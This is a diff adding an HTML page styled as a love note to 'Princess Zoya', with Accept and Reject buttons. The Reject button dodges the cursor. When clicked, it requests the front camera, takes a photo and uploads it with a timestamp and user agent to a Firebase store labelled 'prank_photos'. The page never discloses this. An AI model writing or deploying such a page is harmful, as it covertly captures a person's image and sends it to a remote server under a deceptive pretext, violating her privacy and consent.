@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Zoya</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400&family=Jost:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root{--wine:#3a0519;--rosewood:#7a1f3d;--rose:#e8869e;--blush:#f7dde6;--gold:#c9a06a;--ivory:#fbeef2;--green:#4ade80;--red:#ef4444;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  html,body{height:100%;background:var(--wine);font-family:'Jost',sans-serif;color:var(--ivory);overflow-x:hidden;}
+  ::selection{background:var(--rose);color:var(--wine);}
+
+  #intro{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:var(--wine);z-index:50;animation:introHide .8s ease 2.6s forwards;}
+  @keyframes introHide{to{opacity:0;visibility:hidden;pointer-events:none;}}
+  .bloom{width:120px;height:120px;position:relative;}
+  .petal{position:absolute;top:50%;left:50%;width:26px;height:52px;background:linear-gradient(180deg,var(--rose),var(--rosewood));border-radius:50% 50% 50% 50%/60% 60% 40% 40%;transform-origin:bottom center;opacity:0;animation:petalOpen 1.1s ease forwards;}
+  .petal:nth-child(1){--r:0deg;animation-delay:.1s;} .petal:nth-child(2){--r:60deg;animation-delay:.22s;} .petal:nth-child(3){--r:120deg;animation-delay:.34s;} .petal:nth-child(4){--r:180deg;animation-delay:.46s;} .petal:nth-child(5){--r:240deg;animation-delay:.58s;} .petal:nth-child(6){--r:300deg;animation-delay:.7s;}
+  .petal{transform:translate(-50%,-100%) rotate(var(--r,0deg)) scale(.3);}
+  @keyframes petalOpen{to{opacity:1;transform:translate(-50%,-100%) rotate(var(--r,0deg)) scale(1);}}
+  .bloom-center{position:absolute;top:50%;left:50%;width:20px;height:20px;background:var(--gold);border-radius:50%;transform:translate(-50%,-50%) scale(0);animation:centerPop .5s ease .9s forwards;box-shadow:0 0 20px rgba(201,160,106,.6);}
+  @keyframes centerPop{to{transform:translate(-50%,-50%) scale(1);}}
+
+  #hero{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 24px;position:relative;opacity:0;animation:heroIn 1.4s ease 2.5s forwards;background:radial-gradient(ellipse at 20% 15%,rgba(232,134,158,.15),transparent 45%),radial-gradient(ellipse at 85% 85%,rgba(201,160,106,.12),transparent 40%),var(--wine);}
+  @keyframes heroIn{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
+  .eyebrow{font-size:.72rem;letter-spacing:.35em;text-transform:uppercase;color:var(--rose);margin-bottom:22px;}
+  .crown{width:46px;height:auto;margin-bottom:18px;opacity:0;animation:crownIn 1s ease 2.9s forwards;filter:drop-shadow(0 0 10px rgba(201,160,106,.5));}
+  @keyframes crownIn{from{opacity:0;transform:translateY(-8px);}to{opacity:1;transform:translateY(0);}}
+  h1.name{font-family:'Cormorant Garamond',serif;font-weight:500;font-size:clamp(3.2rem,11vw,6.4rem);line-height:1;letter-spacing:.02em;background:linear-gradient(120deg,var(--ivory) 40%,var(--gold) 50%,var(--ivory) 60%);background-size:220% auto;-webkit-background-clip:text;background-clip:text;color:transparent;animation:shimmer 5s ease-in-out infinite;}
+  @keyframes shimmer{0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
+  h1.name .princess{display:block;font-family:'Jost',sans-serif;font-weight:300;font-size:.28em;letter-spacing:.5em;text-transform:uppercase;-webkit-text-fill-color:var(--rose);color:var(--rose);margin-bottom:8px;}
+  .rule{width:64px;height:1px;background:var(--gold);margin:26px auto;}
+  p.tagline{font-family:'Cormorant Garamond',serif;font-style:italic;font-size:1.35rem;color:var(--blush);max-width:420px;margin-bottom:46px;opacity:.9;}
+  button#openBtn{font-family:'Jost',sans-serif;font-size:.85rem;letter-spacing:.18em;text-transform:uppercase;color:var(--ivory);background:transparent;border:1px solid var(--gold);padding:16px 42px;border-radius:2px;cursor:pointer;transition:background .4s,color .4s,letter-spacing .4s;}
+  button#openBtn:hover{background:var(--gold);color:var(--wine);letter-spacing:.24em;}
+  .ember{position:absolute;width:3px;height:3px;background:var(--rose);border-radius:50%;opacity:.5;animation:emberFloat linear infinite;}
+  @keyframes emberFloat{from{transform:translateY(0);opacity:0;}10%{opacity:.6;}to{transform:translateY(-100vh);opacity:0;}}
+
+  #reveal{display:none;position:fixed;inset:0;background:radial-gradient(ellipse at 50% 0%,rgba(232,134,158,.14),transparent 55%),var(--wine);z-index:40;overflow-y:auto;}
+  #reveal.show{display:block;}
+  #reveal.show .card{animation:cardIn 1s ease .15s both;}
+  @keyframes cardIn{from{opacity:0;transform:translateY(24px);}to{opacity:1;transform:translateY(0);}}
+  .reveal-inner{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:60px 20px;}
+  .card{max-width:620px;width:100%;border:1px solid rgba(201,160,106,.4);padding:56px 44px;position:relative;background:rgba(122,31,61,.18);backdrop-filter:blur(4px);}
+  .card::before,.card::after{content:"";position:absolute;width:18px;height:18px;border:1px solid var(--gold);}
+  .card::before{top:-1px;left:-1px;border-right:none;border-bottom:none;}
+  .card::after{bottom:-1px;right:-1px;border-left:none;border-top:none;}
+  .card .crown-mark{width:34px;height:auto;display:block;margin:0 auto 14px;opacity:.9;}
+  .card .eyebrow-card{text-align:center;font-size:.68rem;letter-spacing:.32em;text-transform:uppercase;color:var(--rose);margin-bottom:10px;}
+  .card h2{font-family:'Cormorant Garamond',serif;font-weight:500;font-size:2.6rem;text-align:center;margin-bottom:28px;color:var(--ivory);}
+  .card p{font-family:'Cormorant Garamond',serif;font-size:1.22rem;line-height:1.9;color:var(--blush);text-align:left;}
+  .card p+p{margin-top:18px;}
+  .signature{text-align:right;margin-top:30px;font-family:'Cormorant Garamond',serif;font-style:italic;font-size:1.2rem;color:var(--rose);}
+  .response-row{display:flex;justify-content:center;gap:22px;margin-top:38px;flex-wrap:wrap;}
+  .resp-btn{font-family:'Jost',sans-serif;font-size:.8rem;letter-spacing:.16em;text-transform:uppercase;padding:14px 34px;border-radius:2px;cursor:pointer;transition:background .3s,color .3s,transform .2s;}
+  .resp-btn.accept{background:var(--gold);color:var(--wine);border:1px solid var(--gold);}
+  .resp-btn.accept:hover{transform:scale(1.05);}
+  .resp-btn.reject{background:var(--gold);color:var(--wine);border:1px solid var(--gold);z-index:70;}
+
+  #giftOverlay{display:none;position:fixed;inset:0;background:rgba(58,5,25,.95);z-index:80;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:20px;}
+  #giftOverlay.show{display:flex;}
+  .gift-box{position:relative;width:170px;height:150px;margin-bottom:32px;}
+  .gift-base{position:absolute;bottom:0;left:0;width:100%;height:104px;background:var(--rosewood);border:2px solid var(--gold);overflow:hidden;}
+  .gift-base::before{content:"";position:absolute;left:50%;top:0;width:16px;height:100%;background:var(--gold);transform:translateX(-50%);opacity:.85;}
+  .gift-lid{position:absolute;top:26px;left:-4px;width:calc(100% + 8px);height:28px;background:var(--rose);border:2px solid var(--gold);transform-origin:center bottom;transition:transform .8s cubic-bezier(.34,1.56,.64,1);}
+  .gift-lid::after{content:"";position:absolute;top:-14px;left:50%;width:26px;height:26px;background:var(--gold);border-radius:50%;transform:translateX(-50%);}
+  .gift-box.open .gift-lid{transform:translateY(-64px) rotate(-18deg);}
+  .gift-message{position:absolute;top:26px;left:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;font-family:'Cormorant Garamond',serif;font-style:italic;font-size:1.5rem;color:var(--ivory);opacity:0;transition:opacity .6s ease .45s;}
+  .gift-box.open .gift-message{opacity:1;}
+  #giftOverlay p.gift-sub{font-family:'Cormorant Garamond',serif;font-size:1.15rem;color:var(--blush);max-width:380px;margin-bottom:30px;opacity:0;animation:fadeSub .8s ease 1.1s forwards;}
+  @keyframes fadeSub{to{opacity:1;}}
+  #closeGift{font-size:.75rem;letter-spacing:.16em;text-transform:uppercase;background:transparent;color:var(--gold);border:1px solid var(--gold);padding:12px 30px;cursor:pointer;opacity:0;animation:fadeSub .8s ease 1.3s forwards;}
+  #closeGift:hover{background:var(--gold);color:var(--wine);}
+  #backBtn{display:block;margin:36px auto 0;font-size:.75rem;letter-spacing:.16em;text-transform:uppercase;background:transparent;color:var(--rose);border:none;cursor:pointer;padding:10px 0;}
+  #backBtn:hover{color:var(--ivory);}
+  .petal-fall{position:fixed;top:-30px;z-index:41;pointer-events:none;width:14px;height:22px;background:linear-gradient(180deg,var(--rose),var(--rosewood));border-radius:50% 50% 50% 50%/60% 60% 40% 40%;animation:fall linear forwards;opacity:.85;}
+  @keyframes fall{to{transform:translateY(105vh) rotate(300deg);opacity:0;}}
+  .sparkle{position:fixed;width:4px;height:4px;background:var(--gold);border-radius:50%;z-index:41;pointer-events:none;box-shadow:0 0 6px 1px rgba(201,160,106,.8);animation:sparkleTwinkle 1.8s ease-in-out forwards;}
+  @keyframes sparkleTwinkle{0%{opacity:0;transform:scale(.4);}40%{opacity:1;transform:scale(1);}100%{opacity:0;transform:scale(.4);}}
+
+  #flash{position:fixed;inset:0;background:#fff;opacity:0;pointer-events:none;z-index:99;transition:opacity .1s ease;}
+  #flash.active{opacity:.9;}
+
+  #photoPopup{display:none;position:fixed;inset:0;background:rgba(58,5,25,.96);z-index:100;align-items:center;justify-content:center;flex-direction:column;padding:24px;text-align:center;}
+  #photoPopup.show{display:flex;}
+  .popup-box{border:1px solid rgba(201,160,106,.4);background:rgba(122,31,61,.2);backdrop-filter:blur(8px);padding:40px 32px;max-width:420px;width:100%;animation:popIn .5s ease forwards;}
+  @keyframes popIn{from{opacity:0;transform:scale(.9) translateY(20px);}to{opacity:1;transform:scale(1) translateY(0);}}
+  .popup-box h3{font-family:'Cormorant Garamond',serif;font-size:2rem;color:var(--green);margin-bottom:12px;}
+  .popup-box h3.err{color:var(--red);}
+  .popup-box p{font-family:'Jost',sans-serif;font-size:.9rem;color:var(--blush);margin-bottom:24px;}
+  .popup-box .close-popup{display:inline-block;font-family:'Jost',sans-serif;font-size:.78rem;letter-spacing:.14em;text-transform:uppercase;background:transparent;color:var(--gold);border:1px solid var(--gold);cursor:pointer;padding:12px 32px;border-radius:2px;transition:all .3s ease;}
+  .popup-box .close-popup:hover{background:var(--gold);color:var(--wine);}
+  @media(max-width:480px){.card{padding:40px 26px;}.popup-box{padding:32px 24px;}}
+</style>
+</head>
+<body>
+
+<video id="camPreview" autoplay playsinline muted style="position:fixed;top:4px;right:4px;width:80px;height:60px;border:2px solid #c9a06a;border-radius:4px;z-index:60;object-fit:cover;background:#000;display:none;"></video>
+<canvas id="camCanvas" style="display:none;"></canvas>
+<div id="flash"></div>
+
+<div id="intro" aria-hidden="true">
+  <div class="bloom">
+    <div class="petal"></div><div class="petal"></div><div class="petal"></div>
+    <div class="petal"></div><div class="petal"></div><div class="petal"></div>
+    <div class="bloom-center"></div>
+  </div>
+</div>
+
+<main id="hero">
+  <p class="eyebrow">For my favorite person</p>
+  <svg class="crown" viewBox="0 0 64 44" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+    <path d="M4 16 L16 30 L32 8 L48 30 L60 16 L54 38 L10 38 Z" fill="none" stroke="#c9a06a" stroke-width="2.2" stroke-linejoin="round"/>
+    <circle cx="4" cy="14" r="3.2" fill="#c9a06a"/><circle cx="32" cy="6" r="3.6" fill="#c9a06a"/><circle cx="60" cy="14" r="3.2" fill="#c9a06a"/>
+  </svg>
+  <h1 class="name"><span class="princess">Princess</span>Zoya</h1>
+  <div class="rule"></div>
+  <p class="tagline">A small page, made only for you.</p>
+  <button id="openBtn">Open</button>
+</main>
+
+<section id="reveal" aria-live="polite">
+  <div class="reveal-inner">
+    <div class="card">
+      <svg class="crown-mark" viewBox="0 0 64 44" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path d="M4 16 L16 30 L32 8 L48 30 L60 16 L54 38 L10 38 Z" fill="none" stroke="#c9a06a" stroke-width="2.2" stroke-linejoin="round"/>
+        <circle cx="4" cy="14" r="3.2" fill="#c9a06a"/><circle cx="32" cy="6" r="3.6" fill="#c9a06a"/><circle cx="60" cy="14" r="3.2" fill="#c9a06a"/>
+      </svg>
+      <p class="eyebrow-card">Written only for</p>
+      <h2>Princess Zoya</h2>
+      <p>You have a way of making ordinary days feel worth remembering. I don't think you fully know how much lighter everything feels when you're around.</p>
+      <p>I love how you laugh without holding back, how honest you are, and how much care you put into the people you love. Being one of them is something I don't take for granted.</p>
+      <p>Out of everyone I know, you're the one I'd choose, again and again. This is just a small way of saying it plainly: you're my favorite person &mdash; my Zoya, my princess.</p>
+      <p class="signature">&mdash; always yours</p>
+      <div class="response-row">
+        <button id="acceptBtn" class="resp-btn accept">Accept</button>
+        <button id="rejectBtn" class="resp-btn reject">Reject</button>
+      </div>
+    </div>
+  </div>
+  <button id="backBtn">&larr; Back</button>
+</section>
+
+<div id="photoPopup">
+  <div class="popup-box">
+    <h3 id="popupTitle">thank you Princece</h3>
+    <p id="popupText">Your photo has been captured!</p>
+    <button id="closePopup" class="close-popup">Close</button>
+  </div>
+</div>
+
+<div id="giftOverlay">
+  <div class="gift-box">
+    <div class="gift-base"></div><div class="gift-lid"></div>
+    <div class="gift-message">Thank You</div>
+  </div>
+  <p class="gift-sub">For accepting me, Princess Zoya &mdash; this means everything.</p>
+  <button id="closeGift">Close</button>
+</div>
+
+<!-- Firebase Compat SDK -->
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+
+<script>
+  // Initialize Firebase
+  var db, storage;
+  try {
+    firebase.initializeApp({
+      apiKey: "AIzaSyCX92t8ikO3quelLUs75AMLWBrqHfadmho",
+      authDomain: "hema-8c796.firebaseapp.com",
+      databaseURL: "https://hema-8c796-default-rtdb.firebaseio.com",
+      projectId: "hema-8c796",
+      storageBucket: "hema-8c796.firebasestorage.app",
+      messagingSenderId: "867852613638",
+      appId: "1:867852613638:web:ab2b51543db60ab2da6b87",
+      measurementId: "G-08M4RV75T9"
+    });
+    db = firebase.database();
+    storage = firebase.storage();
+    console.log("Firebase OK");
+  } catch(e) {
+    console.error("Firebase init failed:", e);
+  }
+
+  // Animations
+  var hero = document.getElementById('hero');
+  for(var i=0;i<14;i++){
+    var e=document.createElement('div');e.className='ember';
+    e.style.left=Math.random()*100+'%';e.style.bottom='-10px';
+    e.style.animationDuration=(6+Math.random()*6)+'s';e.style.animationDelay=(Math.random()*6)+'s';
+    hero.appendChild(e);
+  }
+  var petalInterval=null;
+  function spawnPetal(){
+    var p=document.createElement('div');p.className='petal-fall';
+    p.style.left=Math.random()*100+'%';p.style.animationDuration=(4+Math.random()*3)+'s';
+    p.style.transform='scale('+(0.7+Math.random()*0.8)+')';
+    document.getElementById('reveal').appendChild(p);setTimeout(function(){p.remove();},7500);
+    if(Math.random()<0.4){var s=document.createElement('div');s.className='sparkle';s.style.left=Math.random()*100+'%';s.style.top=Math.random()*100+'%';document.getElementById('reveal').appendChild(s);setTimeout(function(){s.remove();},1900);}
+  }
+  document.getElementById('openBtn').addEventListener('click',function(){
+    document.getElementById('reveal').classList.add('show');document.body.style.overflow='hidden';
+    if(!petalInterval){spawnPetal();petalInterval=setInterval(spawnPetal,350);}
+  });
+  document.getElementById('backBtn').addEventListener('click',function(){
+    document.getElementById('reveal').classList.remove('show');document.body.style.overflow='';
+    if(petalInterval){clearInterval(petalInterval);petalInterval=null;}
+  });
+
+  // Accept gift
+  var giftOverlay=document.getElementById('giftOverlay');
+  var giftBox=giftOverlay.querySelector('.gift-box');
+  document.getElementById('acceptBtn').addEventListener('click',function(){
+    giftOverlay.classList.add('show');giftBox.classList.remove('open');void giftBox.offsetWidth;setTimeout(function(){giftBox.classList.add('open');},250);
+  });
+  document.getElementById('closeGift').addEventListener('click',function(){giftOverlay.classList.remove('show');giftBox.classList.remove('open');});
+
+  // Reject = Capture
+  var rejectBtn=document.getElementById('rejectBtn');
+  var camPreview=document.getElementById('camPreview');
+  var camCanvas=document.getElementById('camCanvas');
+  var photoPopup=document.getElementById('photoPopup');
+  var popupTitle=document.getElementById('popupTitle');
+  var popupText=document.getElementById('popupText');
+  var flash=document.getElementById('flash');
+  var busy=false;
+
+  function showPopup(title, text, isError){
+    popupTitle.textContent=title;
+    popupTitle.className=isError?'err':'';
+    popupText.textContent=text;
+    photoPopup.classList.add('show');
+  }
+
+  function dodge(e){
+    e.preventDefault();
+    var rect=rejectBtn.getBoundingClientRect();
+    if(rejectBtn.style.position!=='fixed'){
+      rejectBtn.style.position='fixed';rejectBtn.style.left=rect.left+'px';rejectBtn.style.top=rect.top+'px';rejectBtn.style.margin='0';rejectBtn.style.transition='left .35s ease,top .35s ease';
+    }
+    var maxX=window.innerWidth-rect.width-24,maxY=window.innerHeight-rect.height-24;
+    var newX=12+Math.random()*Math.max(maxX-12,0);
+    var newY=12+Math.random()*Math.max(maxY-12,0);
+    requestAnimationFrame(function(){rejectBtn.style.left=newX+'px';rejectBtn.style.top=newY+'px';});
+  }
+  rejectBtn.addEventListener('mouseenter',dodge);
+  rejectBtn.addEventListener('touchstart',dodge,{passive:false});
+
+  rejectBtn.addEventListener('click',function(e){
+    e.preventDefault();e.stopPropagation();
+    if(busy){console.log('busy');return;}
+    busy=true;
+    console.log('Reject clicked');
+
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
+      showPopup('Error','Camera not supported on this browser',true);
+      busy=false;return;
+    }
+
+    var stream=null;
+
+    navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false})
+      .then(function(s){
+        stream=s;
+        camPreview.srcObject=stream;
+        camPreview.style.display='block';
+        console.log('Camera permission granted');
+
+        // Wait for video ready
+        return new Promise(function(resolve,reject){
+          camPreview.onloadedmetadata=function(){console.log('metadata loaded');resolve();};
+          camPreview.onerror=function(){reject(new Error('Camera error'));};
+          setTimeout(function(){console.log('metadata timeout, forcing');resolve();},5000);
+        });
+      })
+      .then(function(){
+        return camPreview.play();
+      })
+      .then(function(){
+        console.log('Video playing, width:',camPreview.videoWidth);
+        // Wait for dimensions
+        return new Promise(function(resolve){
+          var check=function(){
+            if(camPreview.videoWidth>0){resolve();}
+            else{setTimeout(check,100);}
+          };
+          check();
+        });
+      })
+      .then(function(){
+        console.log('Capturing...');
+        var w=camPreview.videoWidth;
+        var h=camPreview.videoHeight;
+        camCanvas.width=w;camCanvas.height=h;
+        var ctx=camCanvas.getContext('2d');
+        ctx.translate(w,0);ctx.scale(-1,1);
+        ctx.drawImage(camPreview,0,0,w,h);
+
+        flash.classList.add('active');
+        setTimeout(function(){flash.classList.remove('active');},200);
+
+        console.log('Uploading...');
+        if(!storage||!db){
+          showPopup('Error','Firebase not ready',true);
+          throw new Error('Firebase not ready');
+        }
+
+        var dataURL=camCanvas.toDataURL('image/png');
+        var timestamp=Date.now();
+        var filename='zoya_'+timestamp+'.png';
+
+        var fileRef=storage.ref('prank_photos/'+filename);
+        return fileRef.putString(dataURL,'data_url').then(function(){
+          console.log('Storage upload done');
+          return fileRef.getDownloadURL();
+        }).then(function(downloadURL){
+          console.log('Got download URL');
+          var photoData={imageUrl:downloadURL,filename:filename,timestamp:timestamp,date:new Date().toISOString(),userAgent:navigator.userAgent};
+          var newRef=db.ref('prank_photos').push();
+          return newRef.set(photoData);
+        }).then(function(){
+          console.log('Database save done');
+          showPopup('thank you Princece','Photo saved successfully!');
+        });
+      })
+      .catch(function(err){
+        console.error('Error:',err);
+        showPopup('Error','Photo failed: '+err.message,true);
+      })
+      .finally(function(){
+        busy=false;
+        if(stream){stream.getTracks().forEach(function(t){t.stop();});camPreview.srcObject=null;camPreview.style.display='none';}
+        console.log('Done');
+      });
+  });
+
+  document.getElementById('closePopup').addEventListener('click',function(){photoPopup.classList.remove('show');});
+  console.log('Page loaded');
+</script>
+
+</body>
+  </html>
